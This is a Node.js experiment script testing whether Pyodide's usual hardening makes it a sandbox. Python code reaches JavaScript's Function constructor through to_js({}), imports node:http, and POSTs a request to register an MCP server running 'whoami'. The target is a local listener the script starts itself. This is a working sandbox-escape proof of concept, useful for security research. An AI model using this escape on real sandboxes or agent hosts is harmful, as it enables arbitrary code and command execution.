// Experiment 1: is Pyodide on its own a sandbox?
//
// Loads Pyodide in plain Node with the usual hardening applied:
//   - jsglobals: {}                       (Python's `js` module sees an empty object)
//   - sys.modules['js'] / ['pyodide_js']  set to None, so `import js` fails
//   - fetch, WebSocket and XMLHttpRequest deleted from globalThis
// Then Python climbs from any JS proxy to JavaScript's Function constructor and uses it to import node:http.
// The target is a listener inside this script that records requests and answers 201. Nothing is written to disk.
//
//   node 1-escape-node.mjs
import { createServer } from 'node:http'
import { fileURLToPath } from 'node:url'
import { loadPyodide } from './runtime/pyodide.mjs'

const hits = []
const server = createServer((req, res) => {
  let body = ''
  req.on('data', (c) => (body += c))
  req.on('end', () => { hits.push(`${req.method} ${req.url} ${body}`); res.writeHead(201); res.end('{}') })
})
await new Promise((r) => server.listen(0, '127.0.0.1', r))
const port = server.address().port

const py = await loadPyodide({ indexURL: fileURLToPath(new URL('./runtime/', import.meta.url)), jsglobals: {} })
for (const g of ['fetch', 'WebSocket', 'XMLHttpRequest']) delete globalThis[g]
py.runPython(`import sys\nsys.modules['js'] = None\nsys.modules['pyodide_js'] = None`)

console.log('hardening in place:', py.runPython(`
out = []
for m in ('js', 'pyodide_js'):
    try:
        __import__(m); out.append(m + ' importable')
    except ImportError:
        out.append(m + ' blocked')
', '.join(out)`))

// The escape: to_js({}) is a JS object; its constructor is Object; Object's constructor is Function.
const result = await py.runPythonAsync(`
from pyodide.ffi import to_js
F = to_js({}).constructor.constructor
await F("""return import('node:http').then(h => new Promise(res => {
  const r = h.request({host:'127.0.0.1', port:${port}, method:'POST', path:'/api/v1/mcp/servers',
                       headers:{'content-type':'application/json'}}, x => res('HTTP ' + x.statusCode))
  r.on('error', e => res('error ' + e.code))
  r.end(JSON.stringify({name:'spike', transport:'stdio', command:'whoami'}))
}))""")()
`)
console.log('Python got back:', String(result))
console.log('listener received:', hits.length ? hits : 'nothing')
server.close()
